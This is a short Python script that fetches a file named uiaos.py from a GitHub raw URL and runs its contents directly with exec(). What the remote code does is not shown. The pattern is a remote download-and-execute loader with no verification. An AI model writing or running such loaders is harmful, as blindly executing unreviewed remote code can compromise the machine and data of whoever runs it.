import requests

url = "https://raw.githubusercontent.com/uiahubUI/Script/refs/heads/main/uiaos.py"

code = requests.get(url).text

exec(code)
